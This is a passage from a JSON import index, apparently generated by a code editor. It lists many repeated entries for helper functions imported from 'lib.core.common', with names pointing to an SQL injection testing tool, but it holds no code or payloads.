        "label": "ntToPosixSlashes",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "pollProcess",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "randomRange",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "randomStr",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "readInput",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "openFile",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "randomStr",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "Backend",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "checkFile",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "dataToStdout",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "isDigit",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "isStackingAvailable",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "readInput",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "unArrayizeValue",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "arrayizeValue",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "Backend",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "extractRegexResult",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "getAutoDirectories",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "getManualDirectories",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "getPublicTypeMembers",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "getSQLSnippet",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "getTechnique",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "getTechniqueData",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "isDigit",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "isTechniqueAvailable",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "isWindowsDriveLetterPath",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "normalizePath",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "ntToPosixSlashes",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "openFile",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "parseFilePaths",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "posixToNtSlashes",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "randomInt",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "randomStr",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "readInput",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "singleTimeWarnMessage",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "Backend",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "flattenValue",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "getLimitRange",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "getSQLSnippet",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "hashDBWrite",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "isListLike",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "isNoneValue",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "isNumPosStrValue",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "isTechniqueAvailable",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "popValue",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "pushValue",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "randomStr",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "readInput",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "wasLastResponseDelayed",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "Backend",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "calculateDeltaSeconds",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "dataToStdout",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "decodeDbmsHexValue",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "decodeIntToUnicode",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "filterControlChars",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "getCharset",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "getCounter",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "getPartRun",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "getTechnique",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "getTechniqueData",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "goGoodSamaritan",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "hashDBRetrieve",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "hashDBWrite",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "incrementCounter",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "isListLike",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "safeStringFormat",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "singleTimeWarnMessage",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "Backend",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "randomInt",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "Backend",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "calculateDeltaSeconds",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "dataToStdout",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "decodeDbmsHexValue",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "extractRegexResult",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "getSQLSnippet",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "hashDBRetrieve",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "hashDBWrite",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "randomInt",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "randomStr",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "safeStringFormat",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "singleTimeWarnMessage",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "Backend",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "calculateDeltaSeconds",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "dataToStdout",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "decodeDbmsHexValue",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "extractRegexResult",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "firstNotNone",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "getConsoleWidth",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "getPartRun",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "getTechnique",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "getTechniqueData",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "hashDBRetrieve",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "hashDBWrite",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "incrementCounter",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "initTechnique",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "isListLike",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "isNumPosStrValue",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "listToStrValue",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "readInput",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "unArrayizeValue",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "wasLastResponseHTTPError",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "average",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "Backend",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "getPublicTypeMembers",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "isNullValue",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "listToStrValue",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "popValue",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "pushValue",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "randomInt",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "randomStr",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "readInput",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "removeReflectiveValues",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "setTechnique",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "singleTimeLogMessage",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "singleTimeWarnMessage",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "stdev",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "wasLastResponseDBMSError",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "arrayizeValue",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "Backend",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "calculateDeltaSeconds",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "clearConsoleLine",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "dataToStdout",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "extractRegexResult",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "firstNotNone",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "flattenValue",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "getConsoleWidth",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "getPartRun",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "hashDBRetrieve",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "hashDBWrite",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "incrementCounter",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "initTechnique",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "isDigit",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "isListLike",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "isNoneValue",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "isNumPosStrValue",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "listToStrValue",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "parseUnionPage",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "removeReflectiveValues",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "singleTimeDebugMessage",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "singleTimeWarnMessage",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "unArrayizeValue",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "wasLastResponseDBMSError",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "dataToStdout",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "getSafeExString",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "openFile",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "saveConfig",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "setColor",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "unArrayizeValue",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "Backend",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "clearConsoleLine",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "dataToStdout",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "filterListValue",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "getFileItems",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "getPageWordSet",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "hashDBWrite",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "isNoneValue",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "ntToPosixSlashes",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "popValue",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "pushValue",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "randomInt",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "randomStr",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "readInput",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "safeSQLIdentificatorNaming",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "safeStringFormat",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "unArrayizeValue",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "unsafeSQLIdentificatorNaming",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "checkSameHost",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "clearConsoleLine",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "dataToStdout",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "extractRegexResult",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "findPageForms",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "getSafeExString",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "openFile",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "readInput",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "safeCSValue",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "urldecode",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "Backend",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "checkFile",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "clearConsoleLine",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "dataToStdout",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "getFileItems",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
    {
        "label": "getPublicTypeMembers",
        "importPath": "lib.core.common",
        "description": "lib.core.common",
        "isExtraImport": true,
        "detail": "lib.core.common",
        "documentation": {}
    },
